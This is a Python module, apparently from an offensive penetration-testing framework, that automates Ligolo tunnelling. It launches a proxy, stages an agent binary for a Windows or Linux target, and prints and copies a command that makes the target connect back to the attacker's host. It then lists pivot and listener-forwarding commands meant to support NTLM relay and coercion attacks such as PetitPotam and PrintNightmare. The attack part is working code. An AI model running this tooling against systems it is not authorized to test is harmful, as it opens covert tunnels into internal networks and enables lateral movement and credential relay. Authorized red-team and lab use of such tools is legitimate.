import os
import subprocess
from pathlib import Path

from core.attacker import resolve_lhost
from modules.upload.windows import stage_windows_files
from modules.upload.linux import stage_linux_files
from core.paths import get_tool_path

PROVIDES = []
REQUIRES = []

# --- CLEAN UI PALETTE ---
G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
W_BOLD, DIM = '\033[1m', '\033[2m'

WINDOWS_AGENT = get_tool_path("ligolo/agent.exe")
LINUX_AGENT = get_tool_path("ligolo/agent")

def copy_clipboard(text):
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except Exception:
        return False

def start_proxy():
    try:
        subprocess.Popen(
            ["x-terminal-emulator", "-e", "sudo ligolo-proxy -selfcert"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    except Exception as e:
        print(f"  {R}└── Error starting proxy: {e}{W}")
        return False


def choose_target():
    print(f"\n{W_BOLD}[*] Target OS:{W}")
    print(f"  [{Y}1{W}] Windows")
    print(f"  [{Y}2{W}] Linux\n")
    try:
        choice = input(f"> ").strip()
        return choice
    except (KeyboardInterrupt, EOFError):
        print()
        return None

def deliver_windows():
    if not WINDOWS_AGENT.exists():
        print(f"  {R}└── Error: Missing agent file: {WINDOWS_AGENT}{W}")
        return False
    stage_windows_files([str(WINDOWS_AGENT)])
    return True

def deliver_linux():
    if not LINUX_AGENT.exists():
        print(f"  {R}└── Error: Missing agent file: {LINUX_AGENT}{W}")
        return False
    stage_linux_files([str(LINUX_AGENT)])
    return True

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):
    lhost = resolve_lhost(args)
    port = 11601

    if not lhost:
        print(f"\n{R}[!] Error: Missing LHOST.{W}\n")
        return data

    print(f"\n{W_BOLD}[*] LIGOLO SETUP{W}")
    print(f"  {B}├──{W} LHOST: {C}{lhost}{W}")
    print(f"  {B}└──{W} PORT:  {Y}{port}{W}")

    print(f"\n{W_BOLD}[*] Starting proxy:{W}")
    print(f"      {Y}sudo ligolo-proxy -selfcert{W}")
    if not start_proxy():
        return data

    choice = choose_target()
    if not choice:
        return data

    if choice == "1":
        if not deliver_windows():
            return data
        
        payload = f"agent.exe -connect {lhost}:{port} -ignore-cert"
        print(f"\n{W_BOLD}[*] Run on target:{W}")
        print(f"\n      {Y}{payload}{W}")
        
        if copy_clipboard(payload):
            print(f"      {G}→ payload copied to clipboard{W}\n")

    elif choice == "2":
        if not deliver_linux():
            return data
        
        payload = (
            f"chmod +x agent && "
            f"sudo ./agent -connect {lhost}:{port} -ignore-cert"
        )
        print(f"\n{W_BOLD}[*] Run on target:{W}")
        print(f"\n      {Y}{payload}{W}")
        
        if copy_clipboard(payload):
            print(f"      {G}→ payload copied to clipboard{W}\n")
    else:
        print(f"  {R}└── Error: Invalid selection.{W}\n")
        return data

    print(f"{W_BOLD}[*] Post-connection commands:{W}")
    print(f"      {C}session{W}")
    print(f"      {C}autoroute{W}")
    print()

    print(f"{W_BOLD}[*] Relay / Coercion attacks:{W}")
    print(f"      {DIM}# If you want to run ntlmrelayx, PetitPotam, PrintNightmare,{W}")
    print(f"      {DIM}# ShadowCoerce, PrinterBug, DFSCoerce, etc., expose listeners{W}")
    print(f"      {DIM}# on the agent so internal hosts can reach your Kali.{W}")
    print()
    print(f"      {C}listener_add --addr 0.0.0.0:4444 --to {lhost}:4444 --tcp{W}")
    print(f"      {C}listener_add --addr 0.0.0.0:8080 --to {lhost}:8080 --tcp{W}")
    print()

    print(f"      {DIM}# Requires the Ligolo agent to run as root (or have{W}")
    print(f"      {DIM}# CAP_NET_BIND_SERVICE) to bind ports below 1024.{W}")
    print()


    return data